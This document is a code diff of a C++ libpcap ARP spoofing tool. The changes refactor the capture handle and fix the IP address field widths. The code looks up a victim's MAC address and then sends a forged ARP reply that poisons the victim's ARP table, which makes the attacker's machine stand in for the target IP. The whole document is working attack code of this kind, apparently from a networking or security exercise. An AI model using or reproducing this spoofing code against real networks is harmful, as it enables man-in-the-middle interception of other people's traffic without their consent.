@@ -57,18 +57,17 @@ void info_network::print_status()
 }
 
 // arp_packet
-arp_packet::arp_packet(char INTERFACE[10], char SENDER_IP[16], char TARGET_IP[16]):info_network(INTERFACE, SENDER_IP, TARGET_IP){};
+arp_packet::arp_packet(char INTERFACE[10], char SENDER_IP[16], char TARGET_IP[16]):info_network(INTERFACE, SENDER_IP, TARGET_IP)
+{
+    this->handle = pcap_open_live(this->interface, BUFSIZ, 1, 1000, this->errbuf);
+}
 arp_packet::~arp_packet(){};
 
 void arp_packet::arp_request()
 {
-    // Ethernet_H *eth_h = (Ethernet_H *)malloc(sizeof(Ethernet_H));
-    // Arp_H *arp_h = (Arp_H *)malloc(sizeof(Arp_H));
     unsigned char packet[1514];
-    pcap_t *handle;
 
     cout << "[+] ARP_Request(BroadCast)... then get victim's MAC address!" << endl;
-    handle = pcap_open_live(this->interface, BUFSIZ, 1, 1000, this->errbuf);
     Ethernet_H* eth_h = (Ethernet_H *)packet;
     memcpy(eth_h->dest, "\xff\xff\xff\xff\xff\xff", 6);
     memcpy(eth_h->src, my_MACaddr, 6);
@@ -81,32 +80,30 @@ void arp_packet::arp_request()
     arp_h->p_len = 4;
     arp_h->oper = ntohs(ARP_REQUEST);
     memcpy(arp_h->sender_MAC, my_MACaddr, 6);
-    memcpy(arp_h->target_MAC, "\x00\x00\x00\x00\x00\x00", 6) ;
-    *(uint16_t *)arp_h->sender_IP = my_IPaddr;
-    *(uint16_t *)arp_h->target_IP = inet_addr(sender_IP);
+    *(uint32_t *)arp_h->sender_IP = this->my_IPaddr;
+    memcpy(arp_h->target_MAC, "\x00\x00\x00\x00\x00\x00", 6);
+    *(uint32_t *)arp_h->target_IP = inet_addr(this->sender_IP);
 
-    pcap_sendpacket(handle, packet, sizeof(Ethernet_H)+sizeof(Arp_H));
+    pcap_sendpacket(this->handle, packet, sizeof(Ethernet_H)+sizeof(Arp_H));
     cout << "[+] ARP_Request is done." << endl;
 }
 
 void arp_packet::arp_capture()
 {
-    pcap_t *handle;         /* Session handle */
+    
     struct pcap_pkthdr *header; /* The header that pcap gives us */
     const u_char *packet;       /* The actual packet */
     int res;
 
-    /* Open the session in promiscuous mode */
-    handle = pcap_open_live(this->interface, BUFSIZ, 1, 1000, this->errbuf);
     cout << "[+] Capture ARP_REPLY..." << endl;
     /* Grab a packet */
     while(1){
-        res = pcap_next_ex(handle, &header, &packet);
+        res = pcap_next_ex(this->handle, &header, &packet);
         if(res == 1){
             Ethernet_H* eth_h = (Ethernet_H *)packet;
             if(ntohs(eth_h->type) == ETHERTYPE_ARP){
                 Arp_H* arp_h = (Arp_H *)(packet+sizeof(Ethernet_H));
-                if ((ntohs(arp_h->oper) == ARP_REPLY)){// && (arp_h->sender_IP == (uint8_t *)this->target_IP)){
+                if ((ntohs(arp_h->oper) == ARP_REPLY) && (*(uint32_t *)arp_h->sender_IP == inet_addr(this->target_IP))){
                     cout << "[+] Find sender_IP's MAC addr : ";
                     for(int i = 0; i < 6; i++)
                         printf("%02X",(arp_h->sender_MAC[i]));
@@ -121,16 +118,14 @@ void arp_packet::arp_capture()
         }
     }
     /* And close the session */
-    pcap_close(handle);
+    pcap_close(this->handle);
 }
 
 void arp_packet::arp_reply()
 {
     unsigned char packet[1514];
-    pcap_t *handle;
 
     cout << "[+] ARP_REPLY... Change ARP Table!" << endl;
-    handle = pcap_open_live(this->interface, BUFSIZ, 1, 1000, this->errbuf);
 
     Ethernet_H* eth_h = (Ethernet_H *)packet;
     memcpy(eth_h->dest, sender_MACaddr, 6);
@@ -145,10 +140,10 @@ void arp_packet::arp_reply()
     arp_h->oper = ntohs(ARP_REPLY);
     memcpy(arp_h->sender_MAC, my_MACaddr, 6);
     memcpy(arp_h->target_MAC, sender_MACaddr, 6) ;
-    *(uint16_t *)arp_h->sender_IP = inet_addr(target_IP);
-    *(uint16_t *)arp_h->target_IP = inet_addr(sender_IP);
+    *(uint32_t *)arp_h->sender_IP = inet_addr(target_IP);
+    *(uint32_t *)arp_h->target_IP = inet_addr(sender_IP);
 
-    pcap_sendpacket(handle, packet, sizeof(Ethernet_H)+sizeof(Arp_H));
+    pcap_sendpacket(this->handle, packet, sizeof(Ethernet_H)+sizeof(Arp_H));
     cout << "[+] ARP_REPLY is done." << endl;
     cout << "\033[1;32m[+] Done! Check it now!\033[0m" << endl;
 }
